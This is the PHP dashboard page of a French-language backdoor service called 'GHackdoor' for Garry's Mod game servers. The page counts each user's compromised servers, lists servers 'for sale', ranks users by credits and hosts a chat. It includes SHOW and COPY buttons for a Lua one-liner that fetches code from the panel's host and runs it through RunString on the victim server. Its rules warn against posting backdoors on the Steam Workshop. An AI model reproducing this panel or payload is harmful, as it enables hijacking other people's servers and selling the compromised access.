<?php include('isdefault.php') ?>

<style>
</style>
            <!-- Mobile Menu start -->
            <div class="mobile-menu-area">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="mobile-menu">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Mobile Menu end -->
            <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list">
                                <div class="row">
                                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6">
                                        <div class="breadcomb-wp">
                      <div class="breadcomb-icon">
                        <i class="icon nalika-home"></i>
                      </div>
                      <div class="breadcomb-ctn">
                        <svg viewBox="0 0 960 300">
    <symbol id="s-text">
        <text text-anchor="middle" x="50%" y="80%">GHackdoor</text>
    </symbol>

    <g class = "g-ants">
        <use xlink:href="#s-text" class="text-copy"></use>
        <use xlink:href="#s-text" class="text-copy"></use>
        <use xlink:href="#s-text" class="text-copy"></use>
        <use xlink:href="#s-text" class="text-copy"></use>
        <use xlink:href="#s-text" class="text-copy"></use>
    </g>
</svg>
                       <p>Salut <?php echo account::GetUsername() ?>, C'est un plaisir de te revoir</p>
                      </div>
                    </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="section-admin container-fluid">
            <div class="row admin text-center">
                <div class="col-md-12">
                    <div class="row">
                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                            <div class="admin-content analysis-progrebar-ctn res-mg-t-15">
                                <h4 class="text-left text-uppercase"><b><i class="fas fa-server fa-1x text-white-300"></i> Nombres de Serveurs</b></h4>
                                <div class="row vertical-center-box vertical-center-box-tablet">
                                    <div class="col-xs-3 mar-bot-15 text-left">
                                    </div>
                                    <div class="col-xs-9 cus-gh-hd-pro">
                                        <h2 class="text-right no-margin"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => $_SESSION["id"]]); ?></h2>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12" style="margin-bottom:1px;">
                            <div class="admin-content analysis-progrebar-ctn res-mg-t-30">
                                <h4 class="text-left text-uppercase"><b><i class="fas fa-money-bill-wave fa-1x text-gray-300"></i> Serveurs en ventes</b></h4>
                                <div class="row vertical-center-box vertical-center-box-tablet">
                                  <div class="col-xs-3 mar-bot-15 text-left">
                                    </div>
                                    <div class="col-xs-9 cus-gh-hd-pro">
                                        <h2 class="text-right no-margin"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => 666]); ?></h2>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                            <div class="admin-content analysis-progrebar-ctn res-mg-t-30">
                                <h4 class="text-left text-uppercase"><b><i class="fas fa-user-friends fa-1x text-gray-300"></i> Joueurs Enregistrés</b></h4>
                                <div class="row vertical-center-box vertical-center-box-tablet">
                                  <div class="col-xs-3 mar-bot-15 text-left">
                                    </div>
                                    <div class="col-xs-9 cus-gh-hd-pro">
                                        <h2 class="text-right no-margin"><?php echo $GLOBALS['DB']->Count("players_list"); ?></h2>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                            <div class="admin-content analysis-progrebar-ctn res-mg-t-30">
                                <h4 class="text-left text-uppercase"><b><i class="fas fa-clipboard-list fa-1x text-gray-300"></i> Nombres de requétes</b></h4>
                                <div class="row vertical-center-box vertical-center-box-tablet">
                                    <div class="text-left col-xs-3 mar-bot-15">
                                    </div>
                                    <div class="col-xs-9 cus-gh-hd-pro">
                                        <h2 class="text-right no-margin"><?php echo Stats::GetValue("nbreqs"); ?></h2>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list">
                                <div class="row">
                                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6">
                                   
                                        <div class="breadcomb-wp">
                                       
                                            <div class="input-group margin-bottom-20">
                                            
                                                <div class="input-group-btn">
<button id="button_hide" type="button" style="" class="btn btn-primary text-white no-border" onclick="seebd();">
<span>SHOW</span>
</button>
<button type="button" class="btn btn-primary text-white no-border" onclick="fetchurlcopy()">
<span>COPY</span>
</button>

</div>
<input class="form-control" value="HIDDEN LINK" style="background-color: #152036; width: 600%;"  id="copyfetch" readonly="">

</div>

                                        </div>
                                    </div>
    




                                </div>
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>





            <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list">
                                <div class="row">
                                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6">
                                        <font color="white">
                                    <?php $bsrv = $GLOBALS['DB']->GetContent("server_list", ["userid" => $_SESSION["id"]], "ORDER BY server_users DESC")[0]; 
                                    if(isset($bsrv))
                                    {
                                    ?>
                                    <center>
                            <h2>Meilleur serveur avec <span class="text-danger"><?php echo $bsrv["server_users"]; ?></span> Joueurs</h2>
                            <h3><a href="seeserver.php?server=<?php echo $bsrv["id"]; ?>"><?php echo $bsrv["server_name"]; ?></a></h3>

                            <h2>Vos derniers serveurs</h2>
                            <table class="table table-dark" style="width:100%;">
                            <thead> 
                                <tr>
                                    <th>Nom</th><th>Date</th>
                                </tr>
                            </thead>

                            <tbody>
                                                <?php
                                                foreach($GLOBALS['DB']->GetContent("server_list", ["userid" => $_SESSION["id"]], "ORDER BY first_update DESC LIMIT 10") as $usr)
                                        {

                                            echo 
                                            "
                                                <tr class='item'>
                                                    <td><b>" . htmlspecialchars($usr['server_name']) . "</b></td>
                                                    <td><b>" . $usr['first_update'] . "</b></td>

                                                </tr>
                                            ";
                                            
                                        }

                                                ?>
                                     </tbody>
                        </table>
                        
                            <?php
                        }else{
                            echo "<h3>Vous n'avez pas de serveurs !!</h3>";
                        }
                            ?>
                            </center>
                            </font>
                        </div>
                    </div>
                </div>
                    </div>
                </div>
            </div>
        <div class="product-sales-area mg-tb-30">
            <div class="container-fluid">
                <div class="row">
        <div class="calender-area mg-tb-30">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="calender-inner">
                            <div>
                              <center><font color="white" size="+3">REGLES</font></center>
                              <br/>
                              <center><font color="white" size="+1">Interdit de prêter, donner ou vendre son compte.</font></center>
                              <br/>
                              <hr class="sidebar-divider">
                              <br/>
                              <center><font color="white" size="+1">Ne SURTOUT PAS donner votre PHPSEEID à une personne, sinon elle aura accès à votre compte et vous serez banni !</font></center>
                              <br/>
                              
                              <br/>
                              <hr class="sidebar-divider">
                              <br/>
                              <center><font color="white" size="+1">Interdit de poster des backdoors sur le workshop steam officiel.</font></center>
                              <br/>
                              <hr class="sidebar-divider">
                              <br/>
                              <center><font color="white" size="+1">Interdit de donner les noms et ou les IP des serveurs.</font></center>
                              <br/>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
         <div class="product-sales-area mg-tb-30">
            <div class="container-fluid">
                <div class="row">
                    <div class="calender-area mg-tb-30">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="calender-inner">
                            <div class="card-header py-3">
                  <h3 class="m-0 font-weight-bold text-primary">Chat</h3>
                </div>
                            <div>
                                <div class="form-group">
                        <div class="panel-body" id="chate-body" style="color:black; background-color: #152036; overflow: scroll; height: 50vh;"></div>

              </div>
                <!-- <textarea class="form-control" rows="1" id="chat-text" placeholder="Votre Message"></textarea> -->
                <input type="text" class="form-control" id="chat-text" placeholder="Votre Message">
                <script>
                var input = document.getElementById("chat-text");
                input.addEventListener("keyup", function(event) {
                  if (event.keyCode === 13) {
                   event.preventDefault();
                   document.getElementById("myBtn").click();
                  }
                });
                </script>
              </div><br />
              <button type="button" onclick="AddChat()" id="myBtn" class="btn btn-success"><i class="fa fa-bolt"></i>&nbsp;Envoyer le message</button>
              <?php 
              // if IsAdmin($_SESSION['id']) { ?>
               <!--  <button type="button" onclick="clearchat()" class="btn btn-danger">Clear le chat</button>
                <script>
                function clearchat()
                {
                   

                    $.ajax({
                      method: "POST",
                      url: "core/ajax/clear-chat.php"
                    }).done();
                }


                </script> -->
            <?php 
           // } ?>
        </div>
                            </div>
                        </div>
                    </div>
                </div>
                </div>
            </div>
            <div class="product-sales-area mg-tb-30">
            <div class="container-fluid">
                <div class="row">
                    <div class="calender-area mg-tb-30">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="calender-inner">
                            <div class="card-header py-3">
                  <h3 class="m-0 font-weight-bold text-primary">Statistics</h3>
                </div>
                <font  color="white">
                <table class="table table-dark" style="width:50%">
        <thead> 
            <tr>
                <th>Nom</th><th>Nombres de Serveurs</th><th>Credits</th>
            </tr>
        </thead>

        <tbody>
                            <?php
                            foreach($GLOBALS['DB']->GetContent("users", [], "ORDER BY credit DESC") as $usr)
                    {

                        echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($usr['username']) . "</b></td>
                                <td><b>" . $GLOBALS['DB']->Count("server_list", ["userid" => $usr['id']]) . "</b></td>
                                <td><b>" . htmlspecialchars($usr['credit']) . "</b></td>
                            </tr>
                        ";
                        
                    }

                            ?>
                            </tbody>
    </table>
</font>
                            </div>
                        </div>
                    </div>
                </div>
                </div>
            </div>
        </div>
        <div class="footer-copyright-area">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="footer-copy-right">
                            <p>Copyright © 2019 <a href="https://colorlib.com/wp/templates/">G(bl)Hackdoor</a> All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php include('isdefault_down.php') ?>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script src="https://benpickles.github.io/peity/jquery.peity.min.js"></script>
<script>
$('.magiemagieetvosiesontdugeni').peity('line');
        function seebd()
{
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)'){
        $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)');
    }else{
        $('#copyfetch').val('HIDDEN LINK');
    }
}

    function fetchurlcopy()
{
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)'){
        $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)');
    let copyText = document.getElementById('copyfetch' );
    copyText.select();
    document.execCommand('copy');
    $('#copyfetch').val('HIDDEN LINK');
    }else{
        let copyText = document.getElementById('copyfetch' );
    copyText.select();
    document.execCommand('copy');
    }
}

        </script>
<?php
$url_bd = str_replace("/beta", '', $actual_link);
echo "
        <script>
$('.magiemagieetvosiesontdugeni').peity('line');
        function seebd()
{
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[".$url_bd."/f?k=".$_SESSION['id']."]],RunString)end)'){
        $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[".$url_bd."/f?k=".$_SESSION['id']."]],RunString)end)');
    }else{
        $('#copyfetch').val('HIDDEN LINK');
    }
}

    function fetchurlcopy()
{
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[".$url_bd."/f?k=".$_SESSION['id']."]],RunString)end)'){
        $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[".$url_bd."/f?k=".$_SESSION['id']."]],RunString)end)');
    let copyText = document.getElementById('copyfetch' );
    copyText.select();
    document.execCommand('copy');
    $('#copyfetch').val('HIDDEN LINK');
    }else{
        let copyText = document.getElementById('copyfetch' );
    copyText.select();
    document.execCommand('copy');
    }
}

        </script>
        ";
        ?>

</html>
